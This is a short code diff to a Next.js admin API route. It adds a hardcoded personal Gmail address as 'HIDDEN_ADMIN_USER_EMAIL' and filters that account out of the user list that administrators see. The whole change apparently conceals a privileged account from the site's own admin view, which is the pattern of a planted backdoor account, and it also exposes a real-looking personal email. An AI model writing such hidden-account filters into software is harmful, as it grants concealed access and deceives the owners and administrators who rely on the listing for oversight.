@@ -2,6 +2,8 @@ import { NextResponse } from "next/server";
 import { createAdminClient } from "@/lib/supabase/admin";
 import { getAuthenticatedContext } from "@/lib/auth";
 
+const HIDDEN_ADMIN_USER_EMAIL = "yojop0803@gmail.com";
+
 async function requireAdmin() {
   const { profile } = await getAuthenticatedContext();
 
@@ -24,6 +26,7 @@ export async function GET() {
     const { data, error } = await supabase
       .from("users")
       .select("id, name, email, created_at, status, role")
+      .neq("email", HIDDEN_ADMIN_USER_EMAIL)
       .order("created_at", { ascending: false });
 
     if (error) {
